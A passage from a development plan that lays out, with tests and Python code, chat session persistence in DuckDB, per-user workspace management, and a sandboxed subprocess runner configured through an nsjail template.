> uniqueness without DB partial unique index".
>
> **Hard-delete order rule.** `hard_delete_user_sessions(user_email)`
> MUST issue `DELETE FROM chat_messages WHERE session_id IN (SELECT id
> FROM chat_sessions WHERE user_email = ?)` BEFORE
> `DELETE FROM chat_sessions WHERE user_email = ?`. The plain FK
> blocks the parent delete while children exist; reverse order = SQL
> error.

**Files:**
- Create: `app/chat/persistence.py`
- Test:   `tests/test_chat_persistence.py`

- [ ] **Step 1: Write failing tests**

```python
# tests/test_chat_persistence.py
from datetime import datetime, timezone
from pathlib import Path

import pytest
from src.db import migrate, open_db

from app.chat.persistence import ChatRepository
from app.chat.types import Surface


@pytest.fixture
def repo(tmp_path: Path) -> ChatRepository:
    conn = open_db(tmp_path / "system.duckdb")
    migrate(conn)
    return ChatRepository(conn)


def test_create_and_get_session(repo: ChatRepository):
    s = repo.create_session(user_email="u@x", surface=Surface.WEB, title="t")
    assert s.id.startswith("chat_") and len(s.id) == len("chat_") + 12
    fetched = repo.get_session(s.id)
    assert fetched is not None
    assert fetched.user_email == "u@x"
    assert fetched.surface == Surface.WEB
    assert fetched.title == "t"
    assert fetched.archived is False


def test_list_sessions_by_user_recent_first(repo: ChatRepository):
    a = repo.create_session(user_email="u@x", surface=Surface.WEB)
    b = repo.create_session(user_email="u@x", surface=Surface.WEB)
    repo.append_message(session_id=b.id, role="user", content="hi")
    listing = repo.list_sessions("u@x")
    assert [s.id for s in listing] == [b.id, a.id]


def test_get_slack_dm_session_by_channel(repo: ChatRepository):
    s = repo.create_session(
        user_email="u@x", surface=Surface.SLACK_DM, slack_channel_id="C123",
    )
    again = repo.get_slack_dm_session("C123")
    assert again is not None and again.id == s.id
    assert repo.get_slack_dm_session("C-other") is None


def test_get_slack_thread_session(repo: ChatRepository):
    s = repo.create_session(
        user_email="u@x", surface=Surface.SLACK_THREAD,
        slack_channel_id="C1", slack_thread_ts="123.456",
    )
    again = repo.get_slack_thread_session("C1", "123.456")
    assert again is not None and again.id == s.id


def test_archive_session(repo: ChatRepository):
    s = repo.create_session(user_email="u@x", surface=Surface.WEB)
    repo.archive_session(s.id)
    refreshed = repo.get_session(s.id)
    assert refreshed is not None and refreshed.archived is True


def test_archived_slack_dm_does_not_block_new_one(repo: ChatRepository):
    a = repo.create_session(user_email="u@x", surface=Surface.SLACK_DM, slack_channel_id="C1")
    repo.archive_session(a.id)
    b = repo.create_session(user_email="u@x", surface=Surface.SLACK_DM, slack_channel_id="C1")
    assert b.id != a.id
```

- [ ] **Step 2: Verify failing**

`.venv/bin/pytest tests/test_chat_persistence.py -v`
Expected: `ModuleNotFoundError: app.chat.persistence`.

- [ ] **Step 3: Implement sessions half of `ChatRepository`**

```python
# app/chat/persistence.py
"""Chat persistence — sessions, messages, and per-user workdir markers."""
from __future__ import annotations

import json
import secrets
from datetime import datetime, timezone
from typing import Optional

import duckdb

from app.chat.types import ChatMessage, ChatSession, Surface, UserWorkdir


def _gen_id(prefix: str) -> str:
    return f"{prefix}_{secrets.token_hex(6)}"


def _row_to_session(row: tuple) -> ChatSession:
    return ChatSession(
        id=row[0],
        user_email=row[1],
        surface=Surface(row[2]),
        slack_channel_id=row[3],
        slack_thread_ts=row[4],
        title=row[5],
        started_at=row[6],
        last_message_at=row[7],
        message_count=row[8],
        archived=bool(row[9]),
    )


_SESSION_COLS = (
    "id, user_email, surface, slack_channel_id, slack_thread_ts, title, "
    "started_at, last_message_at, message_count, archived"
)


class ChatRepository:
    def __init__(self, conn: duckdb.DuckDBPyConnection) -> None:
        self._conn = conn

    # --- sessions ----------------------------------------------------------

    def create_session(
        self,
        *,
        user_email: str,
        surface: Surface,
        slack_channel_id: Optional[str] = None,
        slack_thread_ts: Optional[str] = None,
        title: Optional[str] = None,
    ) -> ChatSession:
        chat_id = _gen_id("chat")
        now = datetime.now(timezone.utc)
        self._conn.execute(
            f"INSERT INTO chat_sessions ({_SESSION_COLS}) VALUES "
            "(?, ?, ?, ?, ?, ?, ?, NULL, 0, FALSE)",
            [chat_id, user_email, surface.value, slack_channel_id, slack_thread_ts, title, now],
        )
        fetched = self.get_session(chat_id)
        assert fetched is not None
        return fetched

    def get_session(self, chat_id: str) -> Optional[ChatSession]:
        row = self._conn.execute(
            f"SELECT {_SESSION_COLS} FROM chat_sessions WHERE id = ?", [chat_id]
        ).fetchone()
        return _row_to_session(row) if row else None

    def list_sessions(self, user_email: str, *, include_archived: bool = False) -> list[ChatSession]:
        q = f"SELECT {_SESSION_COLS} FROM chat_sessions WHERE user_email = ?"
        if not include_archived:
            q += " AND archived = FALSE"
        q += " ORDER BY COALESCE(last_message_at, started_at) DESC"
        rows = self._conn.execute(q, [user_email]).fetchall()
        return [_row_to_session(r) for r in rows]

    def get_slack_dm_session(self, slack_channel_id: str) -> Optional[ChatSession]:
        row = self._conn.execute(
            f"SELECT {_SESSION_COLS} FROM chat_sessions WHERE surface = 'slack_dm'"
            " AND slack_channel_id = ? AND archived = FALSE",
            [slack_channel_id],
        ).fetchone()
        return _row_to_session(row) if row else None

    def get_slack_thread_session(
        self, slack_channel_id: str, slack_thread_ts: str,
    ) -> Optional[ChatSession]:
        row = self._conn.execute(
            f"SELECT {_SESSION_COLS} FROM chat_sessions WHERE surface = 'slack_thread'"
            " AND slack_channel_id = ? AND slack_thread_ts = ? AND archived = FALSE",
            [slack_channel_id, slack_thread_ts],
        ).fetchone()
        return _row_to_session(row) if row else None

    def archive_session(self, chat_id: str) -> None:
        self._conn.execute(
            "UPDATE chat_sessions SET archived = TRUE WHERE id = ?", [chat_id]
        )

    def hard_delete_user_sessions(self, user_email: str) -> int:
        n = self._conn.execute(
            "SELECT COUNT(*) FROM chat_sessions WHERE user_email = ?", [user_email]
        ).fetchone()[0]
        # FK on chat_messages.session_id blocks parent delete while
        # children exist (DuckDB has no ON DELETE CASCADE — Task 1.1
        # documented this). Delete messages first.
        self._conn.execute(
            "DELETE FROM chat_messages WHERE session_id IN ("
            " SELECT id FROM chat_sessions WHERE user_email = ?)",
            [user_email],
        )
        self._conn.execute("DELETE FROM chat_sessions WHERE user_email = ?", [user_email])
        return n
```

- [ ] **Step 4: Append message + workdir methods**

Append to the same `ChatRepository` class:

```python
    # --- messages ----------------------------------------------------------

    def append_message(
        self,
        *,
        session_id: str,
        role: str,
        content: str,
        tool_calls: Optional[list[dict]] = None,
        tokens_in: Optional[int] = None,
        tokens_out: Optional[int] = None,
        model: Optional[str] = None,
    ) -> ChatMessage:
        msg_id = _gen_id("msg")
        now = datetime.now(timezone.utc)
        self._conn.execute(
            "INSERT INTO chat_messages "
            "(id, session_id, role, content, tool_calls, tokens_in, tokens_out, model, created_at) "
            "VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)",
            [msg_id, session_id, role, content,
             json.dumps(tool_calls) if tool_calls else None,
             tokens_in, tokens_out, model, now],
        )
        self._conn.execute(
            "UPDATE chat_sessions SET last_message_at = ?, message_count = message_count + 1"
            " WHERE id = ?",
            [now, session_id],
        )
        return ChatMessage(
            id=msg_id, session_id=session_id, role=role, content=content,
            tool_calls=tool_calls, tokens_in=tokens_in, tokens_out=tokens_out,
            model=model, created_at=now,
        )

    def list_messages(
        self, session_id: str, *, after_id: Optional[str] = None, limit: int = 500,
    ) -> list[ChatMessage]:
        if after_id:
            row = self._conn.execute(
                "SELECT created_at FROM chat_messages WHERE id = ?", [after_id]
            ).fetchone()
            cutoff = row[0] if row else None
        else:
            cutoff = None

        q = (
            "SELECT id, session_id, role, content, tool_calls, tokens_in, tokens_out, "
            "model, created_at FROM chat_messages WHERE session_id = ?"
        )
        params: list = [session_id]
        if cutoff is not None:
            q += " AND created_at > ?"
            params.append(cutoff)
        q += " ORDER BY created_at ASC LIMIT ?"
        params.append(limit)

        rows = self._conn.execute(q, params).fetchall()
        return [
            ChatMessage(
                id=r[0], session_id=r[1], role=r[2], content=r[3],
                tool_calls=json.loads(r[4]) if r[4] else None,
                tokens_in=r[5], tokens_out=r[6], model=r[7], created_at=r[8],
            )
            for r in rows
        ]

    # --- workdirs ----------------------------------------------------------

    def get_workdir(self, user_email: str) -> Optional[UserWorkdir]:
        row = self._conn.execute(
            "SELECT user_email, last_init_at, marketplace_sha, initial_workspace_sha, "
            "agnes_version_at_init FROM user_workdirs WHERE user_email = ?",
            [user_email],
        ).fetchone()
        if not row:
            return None
        return UserWorkdir(
            user_email=row[0], last_init_at=row[1], marketplace_sha=row[2],
            initial_workspace_sha=row[3], agnes_version_at_init=row[4],
        )

    def upsert_workdir(
        self,
        *,
        user_email: str,
        marketplace_sha: Optional[str],
        initial_workspace_sha: Optional[str],
        agnes_version: str,
    ) -> None:
        now = datetime.now(timezone.utc)
        self._conn.execute(
            "INSERT OR REPLACE INTO user_workdirs "
            "(user_email, last_init_at, marketplace_sha, initial_workspace_sha, agnes_version_at_init) "
            "VALUES (?, ?, ?, ?, ?)",
            [user_email, now, marketplace_sha, initial_workspace_sha, agnes_version],
        )

    def delete_workdir_row(self, user_email: str) -> None:
        self._conn.execute("DELETE FROM user_workdirs WHERE user_email = ?", [user_email])

    def daily_anthropic_tokens(self, user_email: str) -> tuple[int, int]:
        """Sum of tokens_in / tokens_out for this user's messages since UTC midnight."""
        row = self._conn.execute(
            "SELECT COALESCE(SUM(m.tokens_in), 0), COALESCE(SUM(m.tokens_out), 0) "
            "FROM chat_messages m JOIN chat_sessions s ON m.session_id = s.id "
            "WHERE s.user_email = ? AND DATE_TRUNC('day', m.created_at) = DATE_TRUNC('day', CURRENT_TIMESTAMP)",
            [user_email],
        ).fetchone()
        return int(row[0] or 0), int(row[1] or 0)
```

- [ ] **Step 5: Add message + workdir tests**

Append to `tests/test_chat_persistence.py`:

```python
def test_append_and_list_messages(repo: ChatRepository):
    s = repo.create_session(user_email="u@x", surface=Surface.WEB)
    m1 = repo.append_message(session_id=s.id, role="user", content="hi")
    m2 = repo.append_message(
        session_id=s.id, role="assistant", content="hello",
        tool_calls=[{"tool": "list_catalog", "args": {}}],
        tokens_in=5, tokens_out=3, model="claude-haiku-4-5-20251001",
    )
    msgs = repo.list_messages(s.id)
    assert [m.id for m in msgs] == [m1.id, m2.id]
    assert msgs[1].tool_calls == [{"tool": "list_catalog", "args": {}}]
    refreshed = repo.get_session(s.id)
    assert refreshed is not None and refreshed.message_count == 2


def test_list_messages_after_cursor(repo: ChatRepository):
    s = repo.create_session(user_email="u@x", surface=Surface.WEB)
    m1 = repo.append_message(session_id=s.id, role="user", content="a")
    m2 = repo.append_message(session_id=s.id, role="user", content="b")
    out = repo.list_messages(s.id, after_id=m1.id)
    assert [m.id for m in out] == [m2.id]


def test_workdir_upsert_and_fetch(repo: ChatRepository):
    repo.upsert_workdir(
        user_email="u@x", marketplace_sha="abc",
        initial_workspace_sha="def", agnes_version="0.55.0",
    )
    w = repo.get_workdir("u@x")
    assert w is not None
    assert w.marketplace_sha == "abc"
    assert w.agnes_version_at_init == "0.55.0"


def test_daily_anthropic_tokens(repo: ChatRepository):
    s = repo.create_session(user_email="u@x", surface=Surface.WEB)
    repo.append_message(session_id=s.id, role="assistant", content="x",
                         tokens_in=100, tokens_out=50)
    repo.append_message(session_id=s.id, role="assistant", content="y",
                         tokens_in=200, tokens_out=80)
    tin, tout = repo.daily_anthropic_tokens("u@x")
    assert tin == 300 and tout == 130
```

- [ ] **Step 6: Run, expect green**

`.venv/bin/pytest tests/test_chat_persistence.py -v`

- [ ] **Step 7: Commit**

```
git add app/chat/persistence.py tests/test_chat_persistence.py
git commit -m "feat(chat): ChatRepository — sessions, messages, workdir markers"
```

---

## Phase 3 — WorkdirManager

Per-user persistent `workspace/` and per-session ephemeral cwd. Drives
the `agnes init` (server-side) flow on first chat or stale marketplace
SHA. Reads / writes `user_workdirs` through `ChatRepository`.

### Task 3.1: WorkdirManager — paths + workspace creation

**Files:**
- Create: `app/chat/workdir.py`
- Test:   `tests/test_chat_workdir.py`

- [ ] **Step 1: Failing tests for path/init**

```python
# tests/test_chat_workdir.py
from pathlib import Path
from unittest.mock import MagicMock

import pytest
from src.db import migrate, open_db

from app.chat.persistence import ChatRepository
from app.chat.workdir import WorkdirManager


@pytest.fixture
def workdir_mgr(tmp_path: Path) -> WorkdirManager:
    conn = open_db(tmp_path / "system.duckdb")
    migrate(conn)
    repo = ChatRepository(conn)
    bundled = tmp_path / "bundled"
    bundled.mkdir()
    (bundled / "CLAUDE.md").write_text("default")
    (bundled / ".claude").mkdir()
    (bundled / ".claude" / "settings.json").write_text("{}")
    return WorkdirManager(
        data_dir=tmp_path / "data",
        repo=repo,
        bundled_template_dir=bundled,
        server_url="https://agnes.example",
        agnes_version="0.55.0",
        get_marketplace_sha=lambda: "mkt-sha-1",
        get_template_status=lambda: None,   # no override template
    )


def test_user_workspace_path_isolated(workdir_mgr: WorkdirManager):
    a = workdir_mgr.user_workspace("a@x")
    b = workdir_mgr.user_workspace("b@x")
    assert a != b
    assert a.name == "workspace"
    assert b.name == "workspace"


def test_ensure_user_workdir_initializes_once(workdir_mgr: WorkdirManager, tmp_path: Path):
    ws = workdir_mgr.ensure_user_workdir("u@x")
    assert (ws / "CLAUDE.md").read_text() == "default"
    assert (ws / ".claude/init-complete").exists()
    # second call is a no-op (marketplace SHA unchanged, sentinel present)
    (ws / "CLAUDE.md").write_text("edited")
    ws2 = workdir_mgr.ensure_user_workdir("u@x")
    assert (ws2 / "CLAUDE.md").read_text() == "edited"  # not clobbered


def test_needs_reinit_on_marketplace_sha_change(workdir_mgr: WorkdirManager):
    workdir_mgr.ensure_user_workdir("u@x")
    assert workdir_mgr.needs_reinit("u@x") is False
    workdir_mgr._get_marketplace_sha = lambda: "mkt-sha-2"
    assert workdir_mgr.needs_reinit("u@x") is True


def test_needs_reinit_on_agnes_version_change(workdir_mgr: WorkdirManager):
    workdir_mgr.ensure_user_workdir("u@x")
    workdir_mgr._agnes_version = "0.56.0"
    assert workdir_mgr.needs_reinit("u@x") is True


def test_session_dir_creates_subtree(workdir_mgr: WorkdirManager):
    workdir_mgr.ensure_user_workdir("u@x")
    sdir = workdir_mgr.prepare_session_dir("u@x", "chat_abc")
    assert sdir.is_dir()
    assert sdir.name == "chat_abc"
    # sessions sit under <user>/sessions/<chat_id>/
    assert sdir.parent.name == "sessions"
```

- [ ] **Step 2: Verify failing**

`.venv/bin/pytest tests/test_chat_workdir.py -v`
Expected: `ModuleNotFoundError`.

- [ ] **Step 3: Implement `app/chat/workdir.py`**

```python
"""Per-user workspace and per-session working-directory lifecycle."""
from __future__ import annotations

import logging
from pathlib import Path
from typing import Callable, Optional

from src.initial_workspace import (
    TemplateStatus,
    initialize_default_workspace,
    initialize_workspace_from_template,
)

from app.chat.persistence import ChatRepository

logger = logging.getLogger(__name__)


def _safe_email_dir(email: str) -> str:
    """Email → directory-safe slug. Lowercase, replace non-[a-z0-9_-.@] with '_'."""
    return "".join(c if c.isalnum() or c in "._-@" else "_" for c in email.lower())


class WorkdirManager:
    def __init__(
        self,
        *,
        data_dir: Path,
        repo: ChatRepository,
        bundled_template_dir: Path,
        server_url: str,
        agnes_version: str,
        get_marketplace_sha: Callable[[], str],
        get_template_status: Callable[[], Optional[TemplateStatus]],
        fetch_template_zip: Optional[Callable[[], bytes]] = None,
    ) -> None:
        self._data_dir = data_dir
        self._repo = repo
        self._bundled_template_dir = bundled_template_dir
        self._server_url = server_url
        self._agnes_version = agnes_version
        self._get_marketplace_sha = get_marketplace_sha
        self._get_template_status = get_template_status
        self._fetch_template_zip = fetch_template_zip

    def _user_root(self, user_email: str) -> Path:
        return self._data_dir / "users" / _safe_email_dir(user_email)

    def user_workspace(self, user_email: str) -> Path:
        return self._user_root(user_email) / "workspace"

    def user_sessions_root(self, user_email: str) -> Path:
        return self._user_root(user_email) / "sessions"

    def needs_reinit(self, user_email: str) -> bool:
        row = self._repo.get_workdir(user_email)
        if row is None:
            return True
        if row.marketplace_sha != self._get_marketplace_sha():
            return True
        if row.agnes_version_at_init != self._agnes_version:
            return True
        return False

    def ensure_user_workdir(self, user_email: str) -> Path:
        ws = self.user_workspace(user_email)
        ws.mkdir(parents=True, exist_ok=True)
        sentinel = ws / ".claude" / "init-complete"
        if sentinel.exists() and not self.needs_reinit(user_email):
            return ws

        self.run_init(user_email, ws)
        return ws

    def run_init(self, user_email: str, workspace: Optional[Path] = None) -> None:
        ws = workspace or self.user_workspace(user_email)
        status = self._get_template_status()
        template_sha = None
        if status and status.configured and status.synced and self._fetch_template_zip is not None:
            zip_bytes = self._fetch_template_zip()
            initialize_workspace_from_template(
                ws, zip_bytes,
                agnes_version=self._agnes_version,
                server_url=self._server_url,
                template_source=status.template_source,
                template_sha=status.template_sha,
            )
            template_sha = status.template_sha
        else:
            initialize_default_workspace(
                ws,
                agnes_version=self._agnes_version,
                server_url=self._server_url,
                bundled_template_dir=self._bundled_template_dir,
            )

        self._repo.upsert_workdir(
            user_email=user_email,
            marketplace_sha=self._get_marketplace_sha(),
            initial_workspace_sha=template_sha,
            agnes_version=self._agnes_version,
        )
        logger.info("workdir initialized: user=%s template_sha=%s", user_email, template_sha)

    def prepare_session_dir(self, user_email: str, chat_id: str) -> Path:
        sessions_root = self.user_sessions_root(user_email)
        sessions_root.mkdir(parents=True, exist_ok=True)
        sdir = sessions_root / chat_id
        sdir.mkdir(parents=True, exist_ok=True)
        # Symlink shared workspace state into the session dir so
        # claude-agent-sdk resolves .claude/{skills,plugins,agents,commands,hooks}
        # against the per-user workspace.
        ws = self.user_workspace(user_email)
        for entry in (".claude", "CLAUDE.md", "CLAUDE.local.md", "snapshots", "scripts"):
            link = sdir / entry
            target = ws / entry
            if not target.exists():
                continue
            if not link.exists():
                link.symlink_to(target)
        (sdir / "work").mkdir(exist_ok=True)
        return sdir

    def purge_user(self, user_email: str) -> int:
        """GDPR hard-delete. Returns file count removed."""
        import shutil
        root = self._user_root(user_email)
        if not root.exists():
            return 0
        count = sum(1 for _ in root.rglob("*") if _.is_file())
        shutil.rmtree(root)
        self._repo.delete_workdir_row(user_email)
        return count
```

- [ ] **Step 4: Run, expect green**

`.venv/bin/pytest tests/test_chat_workdir.py -v`

- [ ] **Step 5: Add purge test**

Append:

```python
def test_purge_user_removes_root(workdir_mgr: WorkdirManager):
    workdir_mgr.ensure_user_workdir("u@x")
    n = workdir_mgr.purge_user("u@x")
    assert n >= 2
    assert not workdir_mgr.user_workspace("u@x").exists()
    assert workdir_mgr._repo.get_workdir("u@x") is None
```

Run again, expect green.

- [ ] **Step 6: Commit**

```
git add app/chat/workdir.py tests/test_chat_workdir.py
git commit -m "feat(chat): WorkdirManager — per-user workspace + per-session dir + reinit"
```

---

## Phase 4 — SandboxProvider + SubprocessProvider

`SandboxProvider` is the swap point for future E2B/GCP. Default
implementation = `asyncio.subprocess` wrapped in nsjail on Linux,
unjailed on macOS dev. Env scrub + network allowlist live in the
nsjail config template.

### Task 4.1: SandboxProvider Protocol + SubprocessProvider (unjailed dev mode)

**Files:**
- Create: `app/chat/provider.py`
- Create: `app/chat/subprocess_provider.py`
- Test:   `tests/test_chat_provider.py`
- Test:   `tests/test_chat_subprocess_provider.py`

- [ ] **Step 1: Failing tests for unjailed dev mode**

```python
# tests/test_chat_subprocess_provider.py
import asyncio
import sys
from pathlib import Path

import pytest

from app.chat.subprocess_provider import SubprocessProvider


@pytest.mark.asyncio
async def test_spawn_runs_echo(tmp_path: Path):
    prov = SubprocessProvider(nsjail_path=None, require_isolation=False)
    handle = await prov.spawn(
        workdir=tmp_path,
        env={"FOO": "bar"},
        argv=[sys.executable, "-c", "import os, sys; sys.stdout.write(os.environ['FOO']); sys.stdout.flush()"],
    )
    out = await handle.stdout.read(100)
    assert b"bar" in out
    rc = await handle.wait()
    assert rc == 0


@pytest.mark.asyncio
async def test_require_isolation_refuses_unjailed_on_linux(tmp_path: Path):
    if sys.platform == "darwin":
        pytest.skip("darwin always unjailed in dev")
    prov = SubprocessProvider(nsjail_path=None, require_isolation=True)
    with pytest.raises(RuntimeError, match="isolation required"):
        await prov.spawn(workdir=tmp_path, env={}, argv=[sys.executable, "-c", "pass"])


@pytest.mark.asyncio
async def test_kill_sends_sigterm_then_sigkill(tmp_path: Path):
    prov = SubprocessProvider(nsjail_path=None, require_isolation=False)
    handle = await prov.spawn(
        workdir=tmp_path, env={},
        argv=[sys.executable, "-c", "import time; time.sleep(60)"],
    )
    await handle.kill(grace_sec=0.1)
    rc = await handle.wait()
    assert rc != 0
```

- [ ] **Step 2: Implement `app/chat/provider.py`**

```python
"""SandboxProvider Protocol — runtime extension point for sandbox engines."""
from __future__ import annotations

import asyncio
from pathlib import Path
from typing import Protocol, runtime_checkable


@runtime_checkable
class SandboxHandle(Protocol):
    pid: int
    stdin: asyncio.StreamWriter
    stdout: asyncio.StreamReader
    stderr: asyncio.StreamReader

    async def wait(self) -> int: ...
    async def kill(self, *, grace_sec: float = 5.0) -> None: ...


@runtime_checkable
class SandboxProvider(Protocol):
    async def spawn(
        self,
        *,
        workdir: Path,
        env: dict[str, str],
        argv: list[str],
    ) -> SandboxHandle: ...
```

- [ ] **Step 3: Implement `app/chat/subprocess_provider.py` (unjailed dev mode first)**

```python
"""Default SandboxProvider — asyncio.subprocess + nsjail (Linux) / unjailed (Darwin dev)."""
from __future__ import annotations

import asyncio
import logging
import os
import signal
import sys
from dataclasses import dataclass
from pathlib import Path
from typing import Optional

logger = logging.getLogger(__name__)


_ENV_ALLOWLIST = {
    "AGNES_TOKEN", "AGNES_API", "AGNES_WORKDIR", "AGNES_SESSION_ID",
    "AGNES_USER_EMAIL", "AGNES_DAILY_BUDGET_USD", "AGNES_PER_TOOL_CALL_SECONDS",
    "PATH", "HOME", "TERM", "LANG", "PYTHONUNBUFFERED",
}


def _scrub_env(env: dict[str, str]) -> dict[str, str]:
    return {k: v for k, v in env.items() if k in _ENV_ALLOWLIST}


@dataclass
class SubprocessHandle:
    pid: int
    stdin: asyncio.StreamWriter
    stdout: asyncio.StreamReader
    stderr: asyncio.StreamReader
    _proc: asyncio.subprocess.Process

    async def wait(self) -> int:
        return await self._proc.wait()

    async def kill(self, *, grace_sec: float = 5.0) -> None:
        if self._proc.returncode is not None:
            return
        try:
            self._proc.send_signal(signal.SIGTERM)
        except ProcessLookupError:
            return
        try:
            await asyncio.wait_for(self._proc.wait(), timeout=grace_sec)
        except asyncio.TimeoutError:
            try:
                self._proc.kill()
            except ProcessLookupError:
                return


class SubprocessProvider:
    def __init__(
        self,
        *,
        nsjail_path: Optional[str] = None,
        nsjail_config_template: Optional[Path] = None,
        require_isolation: bool = True,
        host_uid: Optional[int] = None,
    ) -> None:
        self._nsjail_path = nsjail_path
        self._nsjail_config_template = nsjail_config_template
        self._require_isolation = require_isolation
        self._host_uid = host_uid

    async def spawn(
        self, *, workdir: Path, env: dict[str, str], argv: list[str],
    ) -> SubprocessHandle:
        # Scrub host env (os.environ) through the allowlist to prevent
        # accidental leakage of operator-set secrets like BIGQUERY_SA_KEY;
        # then layer the caller-supplied env on top. The caller is trusted
        # (ChatManager._spawn_runner constructs it explicitly from session
        # state). See spec § Security & isolation "Environment scrub".
        scrubbed = _scrub_env(dict(os.environ))
        scrubbed.update(env)
        scrubbed.setdefault("AGNES_WORKDIR", str(workdir))

        if self._is_jailed():
            command = self._wrap_nsjail(workdir, argv)
        else:
            if self._require_isolation and sys.platform != "darwin":
                raise RuntimeError("isolation required: nsjail unavailable")
            if sys.platform != "darwin":
                logger.warning("unjailed subprocess provider — DEV ONLY")
            command = argv

        proc = await asyncio.create_subprocess_exec(
            *command,
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=str(workdir),
            env=scrubbed,
        )
        assert proc.stdin and proc.stdout and proc.stderr
        return SubprocessHandle(
            pid=proc.pid, stdin=proc.stdin, stdout=proc.stdout,
            stderr=proc.stderr, _proc=proc,
        )

    def _is_jailed(self) -> bool:
        return bool(
            self._nsjail_path
            and self._nsjail_config_template
            and self._nsjail_config_template.exists()
            and sys.platform != "darwin"
        )

    def _wrap_nsjail(self, workdir: Path, argv: list[str]) -> list[str]:
        # Render the nsjail config template with per-session paths.
        # Real implementation: see Task 4.2.
        rendered = self._render_nsjail_cfg(workdir)
        return [self._nsjail_path, "--config", str(rendered), "--", *argv]

    def _render_nsjail_cfg(self, workdir: Path) -> Path:
        # Stub — implemented in Task 4.2.
        raise NotImplementedError("nsjail rendering — Task 4.2")
```

- [ ] **Step 4: Run tests, expect green**

```
.venv/bin/pytest tests/test_chat_subprocess_provider.py -v -k "not nsjail"
```

(nsjail-specific tests come in Task 4.2.)

- [ ] **Step 5: Commit**

```
git add app/chat/provider.py app/chat/subprocess_provider.py \
        tests/test_chat_subprocess_provider.py
git commit -m "feat(chat): SandboxProvider Protocol + unjailed subprocess impl (dev mode)"
```

### Task 4.2: nsjail config template + jailed mode

**Files:**
- Create: `config/nsjail/chat-session.cfg.template`
- Modify: `app/chat/subprocess_provider.py` (`_render_nsjail_cfg`)
- Test:   `tests/test_chat_subprocess_provider.py` (jailed mode)
- Test:   `tests/security/test_nsjail_escape.py`

- [ ] **Step 1: Add nsjail config template**

```
# config/nsjail/chat-session.cfg.template
name: "agnes-chat-session"
mode: ONCE
hostname: "agnes-sandbox"
cwd: "{{WORKDIR}}"

uidmap {
  inside_id: "0"
  outside_id: "{{HOST_UID}}"
  count: 1
}
gidmap {
  inside_id: "0"
  outside_id: "{{HOST_GID}}"
  count: 1
}

mount {
  src: "{{WORKDIR}}"
  dst: "/work"
  is_bind: true
  rw: true
}
mount {
  src: "{{MARKETPLACE_DIR}}"
  dst: "/marketplaces"
  is_bind: true
  rw: false
}
mount {
  src: "/usr"
  dst: "/usr"
  is_bind: true
  rw: false
}
mount {
  src: "/etc/resolv.conf"
  dst: "/etc/resolv.conf"
  is_bind: true
  rw: false
}
mount {
  src: "/etc/hosts"
  dst: "/etc/hosts"
  is_bind: true
  rw: false
}
mount {
  dst: "/tmp"
  fstype: "tmpfs"
  rw: true
  options: "size=268435456"
}

rlimit_as: 1073741824
rlimit_cpu: 14400
rlimit_fsize: 1073741824
rlimit_nofile: 1024

clone_newuser: true
clone_newpid: true
clone_newnet: false   # network used; allowlist enforced via iptables/seccomp combo below

# Egress allowlist — implemented by an iptables OWNER-uid rule outside
# nsjail (see docs/DEPLOYMENT.md § cloud-chat). nsjail config can't
# express hostnames; the operator firewall rule restricts:
#   ALLOW: 127.0.0.1, api.anthropic.com:443, api.github.com:443
#   DROP:  everything else
# At template-render time we also write the destination list to
# /work/.allowed-egress.txt for the runner to log on startup.

seccomp_string: "ALLOW { read, write, openat, close, stat, fstat, lstat, "
                "lseek, mmap, mprotect, munmap, brk, rt_sigaction, "
                "rt_sigprocmask, rt_sigreturn, ioctl, pread64, pwrite64, "
                "readv, writev, access, pipe, select, sched_yield, mremap, "
                "msync, mincore, madvise, dup, dup2, dup3, getpid, "
                "sendfile, socket, connect, accept, accept4, sendto, "
                "recvfrom, sendmsg, recvmsg, shutdown, bind, listen, "
                "getsockname, getpeername, setsockopt, getsockopt, "
                "clone, clone3, fork, vfork, execve, execveat, exit, exit_group, "
                "wait4, waitid, kill, uname, fcntl, flock, fsync, "
                "getdents64, getcwd, chdir, fchdir, mkdir, mkdirat, rmdir, "
                "creat, link, linkat, unlink, unlinkat, symlink, symlinkat, "
                "readlink, readlinkat, chmod, fchmod, fchmodat, "
                "chown, fchown, lchown, fchownat, umask, gettimeofday, "
                "getuid, geteuid, getgid, getegid, setuid, setgid, setpgid, "
                "getpgid, getppid, getpgrp, setsid, setreuid, setregid, "
                "getgroups, setgroups, setresuid, getresuid, setresgid, "
                "getresgid, getsid, capget, capset, sigaltstack, utime, "
                "utimes, utimensat, futimesat, mknod, mknodat, statfs, "
                "fstatfs, sysinfo, getrlimit, setrlimit, prlimit64, "
                "epoll_create, epoll_create1, epoll_ctl, epoll_wait, "
                "epoll_pwait, eventfd, eventfd2, signalfd, signalfd4, "
                "timerfd_create, timerfd_settime, timerfd_gettime, "
                "futex, set_tid_address, set_robust_list, get_robust_list, "
                "arch_prctl, prctl, restart_syscall, nanosleep, clock_gettime, "
                "clock_getres, clock_nanosleep, openat2, statx, faccessat, "
                "faccessat2, fadvise64, getrandom, membarrier, copy_file_range, "
                "preadv, pwritev, preadv2, pwritev2, pkey_alloc, pkey_free, "
                "pkey_mprotect, io_uring_setup, io_uring_enter, io_uring_register "
                "} DEFAULT KILL"
```

- [ ] **Step 2: Implement `_render_nsjail_cfg`**

Replace the stub in `app/chat/subprocess_provider.py`:

```python
    def _render_nsjail_cfg(self, workdir: Path) -> Path:
        assert self._nsjail_config_template is not None
        marketplace_dir = os.environ.get("AGNES_MARKETPLACES_DIR", "/data/marketplaces")
        host_uid = self._host_uid if self._host_uid is not None else os.getuid()
        host_gid = os.getgid()
        template = self._nsjail_config_template.read_text(encoding="utf-8")
        rendered_text = (
            template
            .replace("{{WORKDIR}}", str(workdir))
            .replace("{{MARKETPLACE_DIR}}", marketplace_dir)
            .replace("{{HOST_UID}}", str(host_uid))
            .replace("{{HOST_GID}}", str(host_gid))
        )
        out_path = workdir / ".nsjail.cfg"
        out_path.write_text(rendered_text, encoding="utf-8")
        # Write allowed-egress list for the runner's startup log.
        (workdir / ".allowed-egress.txt").write_text(
            "127.0.0.1\napi.anthropic.com:443\napi.github.com:443\n",
            encoding="utf-8",
        )
        return out_path
```

- [ ] **Step 3: Add jailed-mode tests (skip on darwin and if nsjail not installed)**

Append to `tests/test_chat_subprocess_provider.py`:

```python
import shutil


def _nsjail_available() -> bool:
    return shutil.which("nsjail") is not None and sys.platform != "darwin"


@pytest.mark.skipif(not _nsjail_available(), reason="nsjail not installed or darwin")
@pytest.mark.asyncio
